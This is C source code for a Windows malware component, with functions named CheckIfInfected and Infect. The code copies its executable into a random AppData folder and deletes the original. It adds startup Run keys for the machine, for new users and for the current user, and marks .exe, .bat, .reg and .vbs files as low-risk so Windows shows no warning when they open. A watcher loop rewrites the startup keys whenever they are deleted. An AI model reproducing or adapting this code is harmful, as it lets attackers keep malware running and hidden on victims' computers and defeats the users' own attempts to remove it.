#include <windows.h>
#include <shlobj.h>

#include "Globals.h"


void RandStrW(WCHAR *ptr,int len);
void DisableOpenFileWarning();


char UniqName[] = "Digit";
WCHAR wUniqName[] = L"Digit";
char extensions[] = ".exe;.bat;.reg;.vbs;";

BOOL CheckIfInfected() {

	int Len;
	HKEY hKey;
	DWORD KeyOption;


	//MessageBox(NULL,"CheckIfInfected",NULL,MB_OK);
	//first check if 'Uniq' = UID exist
	hKey = NULL;
	KeyOption = 0;
	RegCreateKeyEx(HKEY_CURRENT_USER,SoftwareName,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&KeyOption);
	if(KeyOption==REG_CREATED_NEW_KEY) {  RegCloseKey(hKey); return FALSE; } //not infected

	KeyOption = 0;
	Len = sizeof(Uniq);
	_memset(Uniq,0x00,sizeof(Uniq));
	RegQueryValueEx(hKey,UniqName,0,&KeyOption,Uniq,&Len);
	if(Uniq[0]==0x00) { RegCloseKey(hKey); return FALSE; } //not infected
	RegCloseKey(hKey);

	_memset(wUniq,0x00,sizeof(wUniq));
	MultiByteToWideChar(CP_ACP,0,Uniq,lstrlen(Uniq),wUniq,sizeof(wUniq));

	//MessageBox(NULL,Uniq,NULL,MB_OK);

	return TRUE; //infected
}

void GenUnique(char *ptr);

void Infect() {

	WCHAR AppData[MAX_PATH],DirName[5];
	DWORD LenInBytes,KeyOption,ret;
	HKEY hKey;


	//Drop the file in random folder with random name in AppData // FIXME: Make it use windows shadow copies location
	_memset(DirName,0x00,sizeof(DirName));
	_memset(AppData,0x00,sizeof(AppData));
	_memset(CurrentLocation,0x00,sizeof(CurrentLocation));

	RandStrW(DirName,5);
	SHGetFolderPathW(0,CSIDL_APPDATA,NULL,SHGFP_TYPE_CURRENT,AppData);

	wsprintfW(CurrentLocation,L"%s\\%s",AppData,DirName);
	CreateDirectoryW(CurrentLocation,NULL);
	wsprintfW(CurrentLocation,L"%s\\%s\\%s.exe",AppData,DirName,DirName);
	

	CopyFileW(OldLocation,CurrentLocation,FALSE);

	DeleteFileW(OldLocation);
	//////////////////////////////////////////////

	//Generate UID
	_memset(Uniq,0x00,sizeof(Uniq));
	_memset(wUniq,0x00,sizeof(wUniq));

	GenUnique(Uniq);
	MultiByteToWideChar(CP_ACP,0,Uniq,lstrlen(Uniq),wUniq,sizeof(wUniq));
	//MessageBox(NULL,Uniq,NULL,MB_OK);
	///////////////////////////

	//Create the main registry key
	KeyOption = 0;
	RegCreateKeyEx(HKEY_CURRENT_USER,SoftwareName,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&KeyOption);
	LenInBytes = lstrlen(Uniq) * sizeof(char);
	RegSetValueEx(hKey,UniqName,0,REG_SZ,Uniq,LenInBytes); //store the UID
	RegCloseKey(hKey);
	//////////////////////////////


	/*Create start-up keys*/
	//try first to create admin key
	SetLastError(ERROR_SUCCESS);
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,RunPath,0,KEY_ALL_ACCESS,&hKey);
	if(GetLastError()==ERROR_SUCCESS) { //we are admin or system

		LenInBytes = lstrlenW(CurrentLocation) * sizeof(WCHAR);
		ret = RegSetValueExW(hKey,wUniq,0,REG_SZ,(const BYTE *)CurrentLocation,LenInBytes); //store the startup key
		if(ret!=0) { RegCloseKey(hKey); goto UserPrivs; }
		RegCloseKey(hKey);

		//Write to key for all new user accoutns
		RegOpenKeyEx(HKEY_USERS,AllUsersRunPath,0,KEY_ALL_ACCESS,&hKey);
		LenInBytes = lstrlenW(CurrentLocation) * sizeof(WCHAR);
		RegSetValueExW(hKey,wUniq,0,REG_SZ,(const BYTE *)CurrentLocation,LenInBytes); //store the startup key
		RegCloseKey(hKey);

	}  //we are regular user

	//try second to create user key
UserPrivs:
	RegOpenKeyEx(HKEY_CURRENT_USER,RunPath,0,KEY_ALL_ACCESS,&hKey);
	LenInBytes = lstrlenW(CurrentLocation) * sizeof(WCHAR);
	RegSetValueExW(hKey,wUniq,0,REG_SZ,(const BYTE *)CurrentLocation,LenInBytes); //store the startup key
	RegCloseKey(hKey);
	////////////////////////////////////////
}


void DisableOpenFileWarning() {

	HKEY hKey;
	DWORD KeyOption,LenInBytes,Value;

	KeyOption = 0;
	RegCreateKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&KeyOption);
	LenInBytes = lstrlen(extensions) * sizeof(char);
	RegSetValueEx(hKey,"LowRiskFileTypes",0,REG_SZ,extensions,LenInBytes);
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0",0,KEY_ALL_ACCESS,&hKey);
	Value = 0;
	RegSetValueEx(hKey,"1806",0,REG_DWORD,(const BYTE *)&Value,sizeof(Value));
	RegCloseKey(hKey);

	SetLastError(ERROR_SUCCESS);
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0",0,KEY_ALL_ACCESS,&hKey);
	if(GetLastError()==ERROR_SUCCESS) {

		Value = 0;
		RegSetValueEx(hKey,"1806",0,REG_DWORD,(const BYTE *)&Value,sizeof(Value));
		RegCloseKey(hKey);
	}
}

void ProtectRegistry() {

	/*We wont check if startup keys exist, 
	but blindy set them and use the handles to keep eye of changes,
	and if change is made set them again */
	int i;
	HKEY hKey[3];
	HANDLE hEvent;
	DWORD dwFilter,LenInBytes;

	dwFilter = REG_NOTIFY_CHANGE_NAME|REG_NOTIFY_CHANGE_LAST_SET;

	LenInBytes = lstrlenW(CurrentLocation) * sizeof(WCHAR);

	i = 0;
	_memset(&hKey,0x00,sizeof(hKey));
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,RunPath,0,KEY_ALL_ACCESS,&hKey[i]); //HKEY_LOCAL_MACHINE
	if(hKey[i]!=NULL) { i++; } 
	RegOpenKeyEx(HKEY_USERS,AllUsersRunPath,0,KEY_ALL_ACCESS,&hKey[i]); //HKEY_USERS
	if(hKey[i]!=NULL) { i++; }
	RegOpenKeyEx(HKEY_CURRENT_USER,RunPath,0,KEY_ALL_ACCESS,&hKey[i]); //HKEY_CURRENT_USER
	

	i = 0;
	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL); 
	while(hKey[i]!=NULL) { //All handles to all event, because there may be case someone to try to delete all keys at once
		RegSetValueExW(hKey[i],wUniq,0,REG_SZ,(const BYTE *)CurrentLocation,LenInBytes); //store the startup key
		RegNotifyChangeKeyValue(hKey[i],TRUE,dwFilter,hEvent,TRUE);
		i++;
	}

	while(1) { 
		WaitForSingleObject(hEvent,INFINITE);

		i = 0;
		while(hKey[i]!=NULL) {
			RegSetValueExW(hKey[i],wUniq,0,REG_SZ,(const BYTE *)CurrentLocation,LenInBytes); //set the startup key
			RegNotifyChangeKeyValue(hKey[i],TRUE,dwFilter,hEvent,TRUE);
			i++;
		}
	}
}


